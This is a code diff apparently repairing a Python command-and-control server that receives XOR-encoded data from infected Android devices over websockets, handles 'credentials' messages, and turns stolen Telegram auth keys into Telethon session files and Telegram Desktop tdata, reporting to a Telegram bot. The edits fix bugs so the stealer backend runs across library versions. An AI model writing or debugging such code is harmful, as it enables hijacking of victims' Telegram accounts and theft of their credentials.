@@ -16,10 +16,10 @@ from aiogram.filters import CommandStart
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from telethon import TelegramClient
 from telethon.errors import AuthKeyUnregisteredError
-from opentele.td import TDesktop, Account
-from opentele.td.configs import DcId
-from opentele.td.auth import AuthKey, AuthKeyType
-from opentele.api import API
+# from opentele.td import TDesktop, Account  # lazy import inside function
+# from opentele.td.configs import DcId       # lazy import inside function
+# from opentele.td.auth import AuthKey, AuthKeyType  # lazy import inside function
+# from opentele.api import API               # lazy import inside function
 
 import database
 
@@ -70,7 +70,16 @@ def create_telethon_session_file(session_file_path: Path, auth_key_hex: str, dc_
         conn.commit()
     logger.info(f"Файл сессии Telethon создан: {session_file_path}")
 
+
 def create_tdata_from_hex(auth_key_hex: str, dc_id: int, user_id: int, output_folder: Path):
+    try:
+        from opentele.td import TDesktop, Account
+        from opentele.td.configs import DcId
+        from opentele.td.auth import AuthKey, AuthKeyType
+        from opentele.api import API
+    except Exception as import_error:
+        raise RuntimeError(f"OpenTele недоступен: {import_error}")
+
     auth_key_bytes = bytes.fromhex(auth_key_hex)
     dc_id_obj = DcId(dc_id)
     auth_key = AuthKey(auth_key_bytes, AuthKeyType.ReadFromFile, dc_id_obj)
@@ -91,7 +100,8 @@ def xor_cipher(data: bytes) -> bytes:
 
 def is_rate_limited(ip: str) -> bool:
     current_time = time()
-    CONNECTION_ATTEMPTS[ip] = [t for t in CONNECTION_ATTEMPTS[ip] if current_time - t < TIMEFRAME]
+    # FIX: use CONNECTION_TIMEFRAME instead of undefined TIMEFRAME
+    CONNECTION_ATTEMPTS[ip] = [t for t in CONNECTION_ATTEMPTS[ip] if current_time - t < CONNECTION_TIMEFRAME]
     if len(CONNECTION_ATTEMPTS[ip]) >= MAX_CONNECTIONS_PER_IP:
         logger.warning(f"Rate limit exceeded for IP: {ip}")
         return True
@@ -156,16 +166,17 @@ async def process_credentials(bot: Bot, data: dict):
 
 # --- Обработчики WebSocket ---
 async def c2_handler(websocket: websockets.WebSocketServerProtocol, bot: Bot):
-    # ИСПРАВЛЕНИЕ: Доступ к заголовкам через websocket.request.headers
-    ip = websocket.remote_address[0]
-    headers = websocket.request.headers
+    # Correct access to headers and remote address across websockets versions
+    remote = getattr(websocket, "remote_address", None)
+    ip = remote[0] if isinstance(remote, (list, tuple)) and remote else "unknown"
+    headers = getattr(websocket, "request_headers", {})
     
     if is_rate_limited(ip):
         await websocket.close(1008, "Rate limit exceeded")
         return
 
-    token = headers.get('X-Auth-Token')
-    android_id = headers.get('X-Android-ID', 'unknown')
+    token = headers.get('X-Auth-Token') if hasattr(headers, 'get') else None
+    android_id = headers.get('X-Android-ID', 'unknown') if hasattr(headers, 'get') else 'unknown'
     
     if token != AUTH_TOKEN:
         logger.warning(f"HONEYPOT: Failed auth attempt from {ip} with token '{token}'")
@@ -173,7 +184,7 @@ async def c2_handler(websocket: websockets.WebSocketServerProtocol, bot: Bot):
             f"🍯 *Обнаружена активность в ловушке!*\n\n"
             f"*IP:* `{ip}`\n"
             f"*Причина:* Неверный токен авторизации\n"
-            f"*User-Agent:* `{headers.get('User-Agent', 'N/A')}`"
+            f"*User-Agent:* `{headers.get('User-Agent', 'N/A') if hasattr(headers, 'get') else 'N/A'}`"
         )
         await bot.send_message(CHAT_ID, honeypot_alert, parse_mode="Markdown")
         await websocket.close(1008, "Invalid auth token")
@@ -185,8 +196,15 @@ async def c2_handler(websocket: websockets.WebSocketServerProtocol, bot: Bot):
     
     try:
         async for message in websocket:
+            # Ensure we work with bytes for XOR
+            if isinstance(message, str):
+                message = message.encode('utf-8')
             decrypted_data = xor_cipher(message)
-            data = json.loads(decrypted_data.decode('utf-8'))
+            try:
+                data = json.loads(decrypted_data.decode('utf-8'))
+            except Exception as json_error:
+                logger.warning(f"Failed to decode JSON from client {android_id}: {json_error}")
+                continue
             
             if data.get("type") == "credentials":
                 await process_credentials(bot, data)
@@ -294,9 +312,8 @@ async def main():
     
     bot = Bot(token=BOT_TOKEN)
     
-    # ИСПРАВЛЕНИЕ: Оборачиваем c2_handler в функцию, которая принимает bot
-    # и имеет правильную сигнатуру (websocket, path)
-    async def handler(websocket, path):
+    # Provide a handler compatible with multiple websockets versions
+    async def handler(websocket, *args):
         await c2_handler(websocket, bot)
 
     ws_server = await websockets.serve(
